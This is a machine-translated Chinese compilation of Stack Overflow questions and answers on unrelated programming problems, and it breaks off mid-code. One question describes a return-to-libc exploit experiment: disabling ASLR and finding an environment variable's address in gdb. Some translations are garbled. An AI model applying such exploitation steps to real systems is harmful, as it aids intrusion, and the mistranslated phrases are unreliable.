> 标签：bash, ftp

我正在使用 Bash FTP 命令来 ftp 文件，但是我遇到了一个问题，我尝试创建一个深度超过 2 个文件夹的目录。如果我使用两个深度的文件夹，它可以工作，但如果我深入三个文件夹，那么它会失败。例如：

```
mkdir foo/bar - this works
mkdir foo/bar/baz - this fails 
```

我也试过这个：

```
mkdir -p foo/bar/baz - which didn't work, it ended up creating a '-p' directory 
```

我尝试运行的 shell 脚本实际上非常简单，但正如您所见，目录结构有 3 个文件夹深，并且无法创建所需的文件夹：

```
#!/bin/bash
DIRECTORY="foo/bar/baz"
FILE="test.pdf"         
HOST="testserver"           
USER="test"         
PASS="test"         

ftp -n $HOST <<END_SCRIPT
quote USER $USER
quote PASS $PASS
mkdir $DIRECTORY
cd $DIRECTORY
binary
put $FILE
quit
END_SCRIPT 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-07-19T03:54:52.963

ftp下的mkdir是由ftp服务器实现的，而不是调用/bin/mkdir没有-p这样的选项，你应该做的是

```
mkdir foo
cd foo
mkdir bar
cd bar
mkdir baz
cd baz 
```

如果您仍然想要原始构造，也可以这样做：

```
#!/bin/bash
foo() {
    local r
    local a
    r="$@"
    while [[ "$r" != "$a" ]] ; do
        a=${r%%/*}
        echo "mkdir $a"
        echo "cd $a"
        r=${r#*/}
    done
}
DIRECTORY="foo/bar/baz"
FILE="test.pdf"         
HOST="testserver"           
USER="test"         
PASS="test"         

ftp -n $HOST <<END_SCRIPT
quote USER $USER
quote PASS $PASS
$(foo "$DIRECTORY")
binary
put $FILE
quit
END_SCRIPT 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-06-16T09:32:02.123

改用 lftp：

```
[dong@idc1-server1 ~]$ lftp sftp://idc1-server2
lftp idc1-server2:~> ls
drwxr-xr-x    3 dong     dong         4096 Jun 16 09:11 .
drwxr-xr-x   18 root     root         4096 Apr  1 22:25 ..
-rw-------    1 dong     dong          116 Jun 16 09:28 .bash_history
-rw-r--r--    1 dong     dong           18 Oct 16  2013 .bash_logout
-rw-r--r--    1 dong     dong          176 Oct 16  2013 .bash_profile
-rw-r--r--    1 dong     dong          124 Oct 16  2013 .bashrc
drwx------    2 dong     dong         4096 Jul 24  2014 .ssh

lftp idc1-server2:~> mkdir a/b/c/d
mkdir: Access failed: No such file (a/b/c/d)

lftp idc1-server2:~> mkdir -p a/b/c/d
mkdir ok, `a/b/c/d' created 
```

# haskell - Haskell 无法创建 TypeClass 的实例

> ID：11553431
> 
> 赞同：3
> 
> 时间：2012-07-19T03:17:08.987
> 
> 标签：haskell, types, instance, typeclass

我是 Haskell 的新手，正在尝试使用实例创建一个类。

我有以下代码，我想说的是：1）Branch 可以在其第一个位置保存任何类型，2）创建一个 Linear 类，它采用线性事物并返回一个数字 3）如果Branch 拥有的第一件事是 Num 类的一部分。

```
data Branch a = Branch a Integer deriving (Show, Eq)

class Linear l where
    length :: (Num a) => l -> a

instance (Num a) => Linear (Branch a) where
    length (Branch len _) = len 
```

我收到错误消息：无法从实例声明绑定的上下文 (Num a) 中推断出 (a ~ a1) ...

有人知道如何在 Haskell 中表达我想说的话吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-19T03:31:44.917

您的类定义说`length`必须能够返回用户请求的任何 Num 类型。所以如果用户想要一个 Integer，length 方法必须给他一个 Integer。如果他想要一个 Int 或 Double ，长度也必须给他。

但是，您在实例声明中提供的长度函数不符合要求。例如，当您在 a 上调​​用 length 时`Branch Integer`，length 将返回一个`Integer`。即使用户要求它也不会返回一个`Int`或一个。`Double`

使您的代码工作的一种方法是使用多参数类型类来定义具有两个参数的线性，其中第二种类型是`length`应该返回的数字类型。然后你可以有一个`Linear (Branch a) a`. 您可能还想使用 Functional Dependencies 扩展使其更有用。除了第二个类型参数，您还可以使用 Type Families 扩展来实现类似的效果。

另一种方法是将实例声明更改为 require`Integral a`而不是`Num a`然后`fromIntegral len`用作返回值。这会将存储在分支中的整数类型转换为用户请求的任何数字类型。当然，需要注意的是，您使用非整数数值进行分支不会是`Linear`这种方式的实例。

# nhibernate - 此 SqlParameterCollection 的索引 13 无效，Count=13

> ID：11553437
> 
> 赞同：1
> 
> 时间：2012-07-19T03:18:34.170
> 
> 标签：nhibernate, mapping

这个确切的标题可以在 google 或 stackflow.com 上找到很多次，但我得到这个错误的原因就像它们都没有：我在单元测试代码中没有问题，但应用程序中完全相同的代码导致了这个问题. 我希望这是因为映射问题。

这是我的映射：

```
 <?xml version="1.0" encoding="utf-8" ?>
    <hibernate-mapping xmlns="urn:nhibernate-mapping-2.2" assembly="My.Domain" namespace="My.Domain">
      <class name="My.Domain.ReportFormFlag, My.Domain" table="ReportFormFlag" schema="Core">
        <id name="FlagID">
          <column name="FlagID" sql-type="uniqueidentifier" not-null="true"/>
          <generator class="guid"/>
        </id>
        <property name="ReportInstanceID" column="ReportInstanceID" type="int" not-null="true"/>
        <property name="FormID" column="FormID" type="int" not-null="true"/>
        <property name="SiteOrProjectID" column="SiteOrProjectID" type="int" not-null="true"/>
        <property name="IsFlagged" column="IsFlagged" type="int" not-null="true"/>
        <property name="FlagComment" column="FlagComment" type="string" not-null="false"/>
      </class>
    </hibernate-mapping>

and here is my class

namespace My.Domain
{
    [Serializable]
    public class ReportFormFlag
    {
        public virtual Guid FlagID { get; set; }    
        public virtual int ReportInstanceID { get; set; }
        public virtual int FormID { get; set; }
        public virtual int SiteOrProjectID { get; set; }
        public virtual int IsFlagged { get; set; }
        public virtual string FlagComment { get; set; }
    }
} 
```

我用来插入新记录的代码：

```
 var reportFormFlag = new ReportFormFlag
            {
                ReportInstanceID = 3554,
                FormID = 25,
                SiteOrProjectID = 0,
                FlagComment = "test",
                IsFlagged = 1
            };
_provider.Save(reportFormFlag); 
```

在 NUnit 测试中，它按预期工作，但在应用程序中，save() 导致“此 SqlParameterCollection 的索引 N 无效，Count=N”异常。

我正在使用 NH 3.0、C#3.5、SQL Server 2008 R2。

非常感谢任何见解！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-19T03:30:33.353

通常这意味着您有一个字段在实体中映射了两次。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2016-03-05T16:33:43.933

感谢您的提醒，@ps2goat。今天才看到你的评论！

这是映射问题，但不是因为数据库字段被映射两次。我以前遇到过这个问题，但忘记了。该问题与如何映射某些类型（例如整数和日期时间）的可空数据字段有关。如果 db 中的 int 或 datetiem 字段可以为空，则相应的属性也必须设置为可以为空。在 C# 中，这是通过添加“？”来实现的。到属性的类型。希望这可以帮助某人。

# r - 使用 Unix 从 GMT 'twitter' 格式转换为 UTC

> ID：11553440
> 
> 赞同：0
> 
> 时间：2012-07-19T03:18:55.790
> 
> 标签：r, unix, date-format, date-conversion

我有一些通过他们的 GET 搜索获得的 Twitter 数据。日期具有以下 GMT 格式。

```
Thu, 19 Jul 2012 01:32:43 +0000  
Thu, 19 Jul 2012 01:32:43 +0000  
Thu, 19 Jul 2012 01:32:40 +0000  
Thu, 19 Jul 2012 01:32:39 +0000  
Thu, 19 Jul 2012 01:32:36 +0000  
Thu, 19 Jul 2012 01:32:32 +0000  
Thu, 19 Jul 2012 01:32:28 +0000  
Thu, 19 Jul 2012 01:32:27 +0000  
Thu, 19 Jul 2012 01:32:28 +0000  
Thu, 19 Jul 2012 01:32:27 +0000  
Thu, 19 Jul 2012 01:32:18 +0000 
```

知道如何将它们转换为 UTC 格式吗？`Unix`和/或`R`解决方案将是可取的。

更新：通过 UTC，我的意思是 UTC 时间戳，以秒为单位。例如：1318394558。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-19T03:28:54.803

使用该`date`工具，可能类似于：

```
date -f file.txt "+%Y-%m-%d %H:%M:%S %Z" 
```

结果：

```
2012-07-19 11:32:43 EST
2012-07-19 11:32:43 EST
2012-07-19 11:32:40 EST
2012-07-19 11:32:39 EST
2012-07-19 11:32:36 EST
2012-07-19 11:32:32 EST
2012-07-19 11:32:28 EST
2012-07-19 11:32:27 EST
2012-07-19 11:32:28 EST
2012-07-19 11:32:27 EST
2012-07-19 11:32:18 EST 
```

或者，类似：

```
date -f file.txt "+%F %T" 
```

给出：

```
2012-07-19 11:32:43
2012-07-19 11:32:43
2012-07-19 11:32:40
2012-07-19 11:32:39
2012-07-19 11:32:36
2012-07-19 11:32:32
2012-07-19 11:32:28
2012-07-19 11:32:27
2012-07-19 11:32:28
2012-07-19 11:32:27
2012-07-19 11:32:18 
```

**编辑：**

```
date -f file.txt -u +%s 
```

结果：

```
1342661563
1342661563
1342661560
1342661559
1342661556
1342661552
1342661548
1342661547
1342661548
1342661547
1342661538 
```

高温高压

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-19T03:32:56.970

在`R`,

```
dat <- c("Thu, 19 Jul 2012 01:32:43 +0000",
         "Thu, 19 Jul 2012 01:32:43 +0000",
         "Thu, 19 Jul 2012 01:32:40 +0000",
         "Thu, 19 Jul 2012 01:32:39 +0000")

as.POSIXct(dat, format="%a, %d %b %Y %H:%M:%S %z")
#[1] "2012-07-18 20:32:43 CDT" "2012-07-18 20:32:43 CDT" "2012-07-18 20:32:40 CDT" "2012-07-18 20:32:39 CDT" 
```

看`?strptime`

或者，如果你想要数字

```
as.numeric(as.POSIXct(dat, format="%a, %d %b %Y %H:%M:%S %z"))
[1] 1342661563 1342661563 1342661560 1342661559 
```

# php - codeigniter：为什么 codeigniter 认为表单是获取请求而不是发布请求

> ID：11553442
> 
> 赞同：1
> 
> 时间：2012-07-19T03:19:18.250
> 
> 标签：php, forms, codeigniter, post

这是表格：

```
<?php echo form_open('locker_settingstwo/processform', array('class' => 'form-horizontal')); ?>
        <div class = "lockersettingstwodiv"> 
            <h2><?php echo $this->session->userdata('labelname'); ?></h2>
            <p> Control who can view/ReGemz the collection in this locker </p>
            <input type = "text" name = "testing" value = "" />
            <input type="radio" name="permission" value="1" /> Public - Others can view/edit this locker<br/>
            <input type="radio" name="permission" value="2" /> Me Only - Only you can view/edit this locker<br/>
            <input type="radio" name="permission" value="custom" /> Custom - Locked to everyone, meaning only friends I choose can view/edit this locker<br/>
        </div>
            <input type="submit" name = "Next" value="Next" class="btn btn-large btn-primary" style="margin-left: 0px; margin-top: 14px" />
            <input type="submit" name = "Cancel" value="Cancel" class="btn btn-large btn-primary" style="margin-left: 0px; margin-top: 14px" />
    <?php echo form_close(); ?> 
```

现在当我打印 $_SERVER['REQUEST_METHOD'] 时，它说的是 GET，而不是 POST……这是为什么呢？

这是表单发送到的控制器方法：

```
function processform() 
{
    echo $_SERVER['REQUEST_METHOD'];
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T03:35:07.270

您的主机是如何设置的？有时，当您使用 FastCGI SAPI 时，`$_GET`由于重定向/转发，POST 属性会被转换为超全局属性。

您使用的是什么 SAPI？

# tridion - 即使对于成功发布的项目，发布队列中的状态也保持在“准备传输”

> ID：11553444
> 
> 赞同：2
> 
> 时间：2012-07-19T03:19:26.617
> 
> 标签：tridion, tridion-2011

每当我们从 CMS 发布任何项目时，其状态都不会显示成功。它被卡住以准备运输。但实际上项目正在发布到 CDS。由于此状态问题，该代码无法正常运行，它检查项目的发布状态。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-19T11:45:52.977

得到了解决方案。在 Tridion bin 文件夹中的发布者上有一个事务文件夹。它包含数千个文件。每次发布完成时似乎这些失败的交易都是由发布者处理的，这是没有将发布状态显示为成功的问题。我们删除了这些文件，现在事情正在取得成功。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-19T11:19:52.010

检查传输服务和部署程序的日志文件中有问题的传输包之一发生了什么情况。

我从来没有见过你在这里描述的任何东西，但这确实是你所看到的行为，相关的东西肯定会出现在那里。

# c - read() 嵌套后返回错误地址

> ID：11553445
> 
> 赞同：-1
> 
> 时间：2012-07-19T03:19:38.260
> 
> 标签：c

我正在编写一个简单的 shell 程序，它必须使用 C 中的 read() 函数一次从文件中获取一个字符。 read() 函数是我想从用户那里获取输入的唯一方法。我可以像这样非常简单地让这部分正常运行：

```
int main( int argc, char *argv[] )
{
int error = 0;
int input_result = 1; /*Integer to track the result of inputs.*/
int input_exit = 0;
char input_buffer[100];
char *buffer_pointer = &input_buffer[0];
char *input;

write( 1, "# ", 2 ); /*Display # to signal the user to input data.*/

int input_counter = 0; /*Int that tracks the number of input characters.*/

/*While loop to continually take input from the user.*/
/*Step one of the programming assignment.*/
while( input_exit == 0 && input_result == 1 && input_counter < 15 && error == 0)
{
    input_result = read( 0, input, (size_t) 1 );

    input_buffer[input_counter] = *input;

    printf( "%c - %d\n", input_buffer[input_counter], input_result );

    input_counter++;
} /*End while for user input*/

write( 1, input_buffer, (size_t) input_counter );
} 
```

使用我的输入文件，这也很简单，我得到了正确的输出，没有任何错误。一旦我开始使代码更复杂并添加一些嵌套的 while 循环，我就会开始收到“错误地址”错误。引发错误的代码如下所示。附带说明一下，我确实意识到我的 C 编程总体上并不是最好的，有些事情我可以改变，但是我想只关注阅读的问题。提前感谢您的帮助，非常感谢。

```
int main( int argc, char *argv[] )
{
/*Infinite loop to keep the shell running until it is implicitly ended by the user.*/
while( 1 )
{
    int error = 0; /*Int to keep track if an error occurred.*/

    char input_buffer[101]; /*Array of chars to hold the input.*/
    char *input_bufferp = &input_buffer[0]; /*Pointer to the first element of the char array.*/
    char *input; /*Char pointer to hold the read input*/
    char *newline = "\n";
    int buffer_counter = 0; /*Int that tracks the number of input characters.*/
    int input_result = 1; /*Int to hold the result of the read.*/

    char input_string[17][64]; /*Array to the parsed input data.*/
    char **input_stringp; /*Pointer to the first element of the string array.*/
    char *input_strings; /*Holds the parsed information before it is organized.*/
    int string_counter = 0; /*Int to track the number of strings.*/

    write( 1, "# ", 2 ); /*Display # to signal the user to input data.*/

    /*While loop to parse the information into separate strings.*/
    /*This while loop contains steps 1 and 2.*/
    while( string_counter == 0 && error == 0)
    {
        /*While to take in information via read.*/
        while( buffer_counter < 100 && input_result == 1 )
        {
            input_result = read( 0, input, (size_t) 1 ); /*Read one char from the user.*/

            /*If statement to signal an input error.*/
            if( input_result == -1 )
            {
                error = 1; /*Signal the error*/
                printf( "\nInput errno: %s\n", (char *)strerror(errno) ); /*Inform the user of the error.*/

                exit(0);
            }/*End if to signal an error.*/

            /*If to handle the end of the file.*/
            else if( input_result == 0 )
            {
                input_buffer[buffer_counter] = '\0'; /*Place the escape char.*/
            }/*End if for end of file.*/

            /*If statement handles a proper read from the user.*/
            else if( input_result == 1 )
            {
                /*If statement to check for a new line.*/
                if( strcmp( input_bufferp[buffer_counter], newline ) == 0 )
                {
                    input_result = 0; /*Set variable to exit the while loop.*/
                    input_buffer[buffer_counter] = '\0'; /*Place the escape char.*/
                }/*End new line if.*/

                /*Else statement to put input into the buffer.*/
                else
                {
                    input_buffer[buffer_counter++] = *input; /*Place the input into the buffer.*/
                }/*End buffer else.*/
            } /*End good input read.*/
        } /*End input gather while loop.*/

        write( 1, input_bufferp, (size_t) buffer_counter ); /*Echo the input to the user*/

        input_strings = strtok( input_bufferp, " \t" ); /*Split the input into tokens.*/

        /*While loop to tokenize the rest of the data.*/
        while( input_strings != NULL )
        {
            input_stringp[string_counter++] = input_strings; /*Store the tokenized string.*/
            input_strings = strtok( NULL, " \t" ); /*Spilt the remain data into tokens.*/
        } /*End tokenizer while loop.*/

        input_stringp[string_counter--][0] = '\0'; /*Please the escape char.*/
    } /*End parsing while loop.*/

    /*Check if the user wants to exit.*/
    if( strncmp( *input_stringp, "exit", 4 ) == 0 )
    {
        exit( 0 ); /*Exit the shell.*/
    } /*End if to exit program.*/

} /*End of infinite while loop.*/
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-19T03:30:57.763

在将变量设置为某个值之前，您不能使用该变量的值。您永远不会初始化`input`为指向任何东西，然后将其值传递给`read`，特别是读取数据到任何地方。

第二个参数`read`告诉`read`存储数据的位置。它必须指向您已分配用于存储一个或多个字符的空间，而您的代码永远不会这样做。

改为`input`a `char`，而不是a `char *`。这将分配空间来存储一个字符。然后传递to的*地址*。`input``read`

# python - 具有相等键的 Python 字典排序

> ID：11553446
> 
> 赞同：2
> 
> 时间：2012-07-19T03:19:44.360
> 
> 标签：python, dictionary, floating-point, hashmap

我认为这一定已经得到了回答，但我在谷歌或这里找不到任何东西。

我知道，一般来说，您不能依赖 Python 字典的顺序。但是，如果您有两个具有*相同*键的字典，您是否也可以依赖于相同顺序的值？

我问是因为我正在尝试比较两个浮点数字典，所以我不能使用`dict1==dict2`. 我的函数看起来像这样：

```
def _compare_dict(self, d1, d2):
    """
    Compares two dictionaries of floating point numbers
    for equality.
    """
    if d1.keys() != d2.keys():
        return False

    zipped = zip(d1.itervalues(), d2.itervalues())
    return len(filter(lambda x: abs(x[0] - x[1]) > sys.float_info.epsilon, zipped)) == 0 
```

这是一个危险的游戏吗？在一项测试中，该命令似乎成立：

```
In [126]: d1={'a': 3, 'b': 2, 'c': 10}
In [127]: d2={'b': 10, 'c': 7, 'a': 2}

In [128]: d1
Out[128]: {'a': 3, 'b': 2, 'c': 10}

In [129]: d2
Out[129]: {'a': 2, 'b': 10, 'c': 7} 
```

但我不知道这是否是我可以指望的。当然，也欢迎其他用于比较两个浮点数字典的解决方案。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-19T03:28:50.533

根据字典的构建方式，您不能依赖它。

一些例子：

```
>>> a = dict.fromkeys(range(1000))
>>> b = dict.fromkeys(range(500,600))
>>> for i in range(500):
    del a[i]

>>> for i in range(600,1000):
    del a[i]

>>> all(i==j for i,j in zip(a,b))
False
>>> a == b
True 
```

`a`是一个更大的哈希表，因为它为 1000 个对象分配了空间，而`b`只能容纳大约 100 个对象而不会增长一点。所以哈希的存储方式可以改变迭代顺序

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-19T03:45:15.740

```
def _compare_dict(self, d1, d2):
    """
    Compares two dictionaries of floating point numbers
    for equality.
    """
    if len(d1) != len(d2): # comparing `.keys()` is futile and slow
        return False
    try:
        return all(abs(d1[k] - d2[k]) < sys.float_info.epsilon for k in d1)
    except KeyError:
        return False 
```

这**仍然不适**用于小于`-2`或大于的数字，`2`因为您错误地考虑了 epsilon

相反，您需要选择一种方法来比较有意义的浮点数。您可以选择使用固定的 epsilon，但这只能在一定程度上起作用。花车可以非常非常大。

使用相对比较通常比绝对比较好

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-19T03:32:17.310

我会推荐这样的东西：

```
def _compare_dict(self, d1, d2):
    if set(d1.keys()) != set(d2.keys()):
        return False

    for key in d1:
        if abs(d1[key]-d2[key]) > sys.float_info.epsilon:
            return False

    return True 
```

它很容易阅读，它会`False`在注意到两个不在其中的值时立即返回，`sys.float_info.epsilon`而不是比较所有值。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-19T03:31:37.793

字典没有排序，除非你使用python 3.3 中存在的[冻结字典](http://www.python.org/dev/peps/pep-0416/)，否则它们不能被排序

现在要比较键，您可以将键转换为一组：

```
a = {'a': 0, 'b': 1}
b = set(a)
c = set(a.keys())  # just another way to be clearer

b == c
True 
```

或者您可以创建一个列表并订购它来比较它们，我更喜欢设置方法。

# c - 在 gdb 中查找环境变量地址时奇怪的事情

> ID：11553450
> 
> 赞同：6
> 
> 时间：2012-07-19T03:20:35.903
> 
> 标签：c, linux, debugging, gdb

最近我正在做一些 Return-to-libc 攻击实验，基于论文[*Bypassing non-executable-stack during exploit using return-to-libc*](http://www.google.com.hk/url?sa=t&rct=j&q=Bypassing+non-executable-stack+during+exploitation+using+return-to-libc+&source=web&cd=1&ved=0CFQQFjAA&url=http%3A%2F%2Fwww.infosecwriters.com%2Ftext_resources%2Fpdf%2Freturn-to-libc.pdf&ei=0XAHUJKpIPGjiAepsLmFBA&usg=AFQjCNHaszd69G_M9szFbIAwR5VWrTT0OQ) with my Ubuntu11.10。

在我的实验之前，我关闭了 ALSR。

根据论文，我可以在gdb中找到环境变量SHELL="/bin/bash"的地址（使用gdb调试我要攻击的程序）：

![在此处输入图像描述](../Images/6a548ec661cda1bceb989371f9cb855c.png)
![在此处输入图像描述](../Images/d3757410e4b2a3b900a085be218541ba.png)

但是当我尝试使用它进行Return-to-libc实验时，我发现这个地址是**错误的。**

然后我写了一个简单的程序来获取环境变量地址：

![在此处输入图像描述](../Images/afeea95e5348a96f7d02e6de5b89d27e.png)

当我在终端中运行这个程序时，我得到了**正确**的地址：

![在此处输入图像描述](../Images/f19e9eb32883cc6d3fe0632ba81f691d.png)

**有了这个地址，我就可以进行攻击了。**

我也找到了关于这个的相关[问题](https://stackoverflow.com/questions/1102712/why-is-there-a-difference-in-memory-address-of-environment-variable-when-running)。但答案并没有真正意义（第二个可能更好）。

请告诉我一些有关此的细节。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-19T03:54:51.007

从您的屏幕截图中，我假设您在 32 位英特尔平台上运行。我还没有花时间来全面研究这个问题的答案，但以下几点值得注意：

1.  我敢打赌，你的整个环境都在同一个地方，并且像 c 风格的字符串一样紧密地打包在一起。（尝试`x/100s **(char***)&environ`）。
2.  当我在我的 x86-64 安装上尝试 ths 时，我在环境之后看到的唯一东西就是我的命令行和一些空字符串。
3.  在`0xBffff47A`处，您非常接近用户地址空间的顶部（在 处结束`0xC0000000`）。

所以，我的猜测是这里发生的事情是：

1.  环境块和命令行参数在启动期间的某个时间点以打包形式被塞入用户地址空间的末尾。
2.  当您在 GDB 或终端中运行程序时，您的环境的内容会有所不同。例如，我`_=/usr/bin/gdb`在 GDB 下运行时注意到“”，我敢打赌只有在 GDB 下运行时才会出现。

结果是，虽然您的固定指针倾向于落在环境块的中间某处，但它不会每次都落在同一个地方，因为环境本身在运行之间会发生变化。

# c++ - 在树中找到最小值的路径

> ID：11553452
> 
> 赞同：3
> 
> 时间：2012-07-19T03:20:40.567
> 
> 标签：c++, algorithm, tree

这是我的研究代码中的一个问题，我想知道这样做的有效方法是什么。我省略了不必要的细节，并以一种可以理解问题症结的方式呈现它。

假设我有一棵二叉树，每个节点上都有数字。我想找到从根到叶的树中所有分支的最小总和。下面是一个非常粗略的伪代码。

```
int minimum(tree){
   // Some base cases
   left_min = minimum(tree->left);
   right_min= minimum(tree->right);
   if (left_min < right_min){
      return current_value + left_min;
   }
   else{
      return current_value + right_min;
   }
} 
```

由此，我可以计算出最小值。但是，如果我想计算给我最小值的节点，我该怎么做？即，如果答案是 14，我想找出树中每个级别的哪些节点加起来得到 14。在对现有函数进行最小更改的情况下，执行此操作的有效方法是什么？通过最小的更改，我的意思是我可以添加额外的变量来跟踪分支，但不能完全重写函数。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-19T03:37:37.240

您可以使用列表、堆栈或队列来代替向量：

```
typedef vector<yourIdType> idvec;

int minimum(tree, idvec &path){
   // Some base cases
   idvec leftPath, rightPath;
   left_min = minimum(tree->left, leftPath);
   right_min= minimum(tree->right, rightPath);
   if (left_min < right_min){
      swap(path, leftPath);
      path.push_back(thisNodeId);
      return current_value + left_min;
   } else {
      swap(path, rightPath);
      path.push_back(thisNodeId);
      return current_value + right_min;
   }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-19T03:25:00.233

您可以使用列表/队列作为额外参数来跟踪所选节点：

```
int minimum(tree, list){
   List templeft, tempright;
   // Some base cases
   left_min = minimum(tree->left, templeft);
   right_min= minimum(tree->right, tempright);
   if (left_min < right_min){
      list.push_back(templeft);
      list.push_back(current);
      return current_value + left_min;
   }
   else{
      list.push_back(tempright);
      list.push_back(current);
      return current_value + right_min;
   }
} 
```

# python - 由 Django 提供支持的站点中的 Unicode

> ID：11553454
> 
> 赞同：1
> 
> 时间：2012-07-19T03:21:10.213
> 
> 标签：python, django, unicode

这是几周内我第二次被困在编码问题上。我已经在这个问题上花了很长时间，如果能得到任何帮助，我将不胜感激。

这就是我想要做的：

1) 从我计算机上的 MySQL 表中选择一些行。

2) 将这些行写入文本文件。

3) 将文本文件传输到我的 Amazon EC2 Ubuntu 实例。

4) 将文本文件的内容写入 MySQL 数据库。

5) 让 Django 从#4 中的数据库中选择一些行。

6) 在网站上展示。

在第 1 步中，我只有一个普通的 SELECT 语句。在第 2 步中，我这样做了：

```
file = codecs.open('commentsfordjango.txt', encoding = 'utf-8', mode='w')
file.write(fullcomment.decode('utf8') + '\n\n\n\n\n\n') 
```

在第 2 步之后，我在 Windows 中打开了 .txt 文件，我可以看到所有实际的汉字，没有任何错误。

在第 3 步中，我刚刚使用 WinSCP 传输了文件。在第 4 步中，我这样做了：

```
file = open('/usr/local/src/blog/commentsfordjango.txt', 'r')
cursor.execute("INSERT INTO polls_poll (commenttext, pos, neu, neg) VALUES (%s, 0, 0, 0)", line) 
```

在第 5 步中，我这样做了`views.py`：我只是返回了与模型相对应的对象。我的模型有一个**unicode**函数，但我没有调用它，因为我默认读取它，当你调用你的对象时它已经被调用。

在第 6 步中，我的 HTML 文件在文件顶部有以下行：

```
<meta charset="utf-8" /> 
```

此外，我将我的 Apache 编码默认值更改为 Unicode。我还确保我在第 4 步中的 SQL 数据库是 Unicode 格式的。

然而，在这一切之后，我的网站仍然显示了一堆不可读、奇怪的字符：äººåœ¨åšï¼Œå¤©åœ¨çœ‹ã€。

任何帮助将不胜感激 - 我已经尝试了很多涉及 .decode() 和 .encode('utf-8') 的变体，并且已经在这个问题上花费了太长时间！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T03:39:15.587

在第 2 步中，您应该将文本编码为 UTF-8。

```
with open("commentsfordjango.txt", "wb") as f:
    f.write(fullcomment.encode('utf8')) 
```

在第 3 步中，您可以将从文件中读取的数据解码回 unicode。

```
with open("commentsfordjango.txt", "rb") as f:
    for line in f.read().decode("utf-8").splitlines():
        cursor.execute("INSERT INTO polls_poll (commenttext, pos, neu, neg) VALUES (%s, 0, 0, 0)", line) 
```

更好的解决方案是只使用 Django 的内置[loaddata/dumpdata](https://docs.djangoproject.com/en/1.4/ref/django-admin/#django-admin-loaddata)工具。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T08:19:01.220

问题的很大一部分可能是您手动将项目插入数据库而不是使用 Django 的数据库 ORM。ORM 负责所有的编码/解码，确保您从数据库中获得良好的 unicode，无论数据库本身使用什么编码。

所以：你真的确定你在数据库中插入了正确的编码吗？您可能应该使用 ORM 进行快速测试。确保您以正确的方式阅读文件`codecs.open()`（您似乎正在这样做）并将其填充到 django 模型中并保存它们。

# security - wkhtmltopdf 的 sfGuard 令牌登录

> ID：11553458
> 
> 赞同：2
> 
> 时间：2012-07-19T03:22:02.393
> 
> 标签：security, symfony-1.4, wkhtmltopdf, sfguard

[wkhtmltopdf](http://code.google.com/p/wkhtmltopdf/)允许使用 webkit 浏览器制作浏览器视图的屏幕截图。

我有一个需要登录的 Symfony 1.4 应用程序，我想使用 wkhtmltopdf 创建“打印此页面”功能。

我怎样才能安全地促进这一点。我正在考虑在每个屏幕上为打印按钮创建一个一次性令牌，允许 wkhtmltopdf 在不使用用户密码的情况下登录。

关于如何构建它的任何建议？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T02:15:17.397

我们已经得出结论，使用内置的“让我登录”功能来解决这个问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-16T16:17:06.667

您会考虑使用不同的打印框架吗？jquery 插件（例如[https://github.com/ianoxley/jqueryprintpage#readme](https://github.com/ianoxley/jqueryprintpage#readme)）呢？这样您就不必允许从会话外部访问受限区域。

如果您仍想使用[wkhtmltopdf](http://code.google.com/p/wkhtmltopdf/)，您可以轻松创建一个接收 url 和 user_id 并创建唯一令牌的操作，我可能会将此令牌保存在您的数据库或键值缓存中（取决于您的系统架构） . 我不会提前创建唯一令牌，我认为最好按需创建它（当您的用户要求打印时）。

您有几个选项可以在安全操作中启用打印，

1) 创建自定义安全过滤器。在过滤器中，除了经过身份验证的请求外，您还必须允许包含“token”参数的请求，并正确组合 url 和用户

2) 将操作更改为不安全。如果您不想更改安全过滤器，则必须将每个操作更改为“不安全”并创建一个函数来验证请求是否经过身份验证或是否具有正确的令牌参数。

使用一次后删除每个令牌会很聪明，这会使猜测令牌变得更加困难。

此外，您可能希望创建一个定期工作程序来清除从未使用过的旧令牌。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T06:10:07.137

即使您已经决定了一种方法，我仍然想再添加一个替代选项，以帮助其他人查看此问题。

另一种替代方法可能是获取正在查看的页面的当前源并使用类似的东西将其发布到您的打印机后端

```
$.post("/printer", document.documentElement.outerHTML); 
```

通过这种方式，您还可以轻松地预处理 HTML。您的支持者可以首先存储 HTML，然后对其进行解析，例如转换图像或删除页面中不会在打印时使用的某些部分。

# java - JLabel 图像数组

> ID：11553461
> 
> 赞同：6
> 
> 时间：2012-07-19T03:22:31.327
> 
> 标签：java, swing, jlabel, imageicon

我正在尝试将相同的 jlabel 存储图像两次加载到 gridlayout 面板中，但是不是创建图像的两个实例，而是图像仅显示一次然后移动。

如何将pieces 数组中的相同JLabel 位置存储到boardLabels 数组中的多个JLabel 中。

谢谢 ：）

```
public static JPanel boardPanel = new JPanel(new GridLayout(4, 0));
public static JLabel pieces[] = new JLabel[2];
private static JLabel[] boardLabels = new JLabel[4];

public MainFrame() {
    pieces[0] = new JLabel(new ImageIcon(System.getProperty("user.dir") + "/images/piece1.png"));
    pieces[1] = new JLabel(new ImageIcon(System.getProperty("user.dir") + "/images/piece2.png"));

    this.add(boardPanel);
    displayGUIboard();
}

public static void displayGUIboard() {

    //ERROR - the label in pieces[0] is not copied into both boardLabels [0] and [1]
    boardLabels[0] = pieces[0];
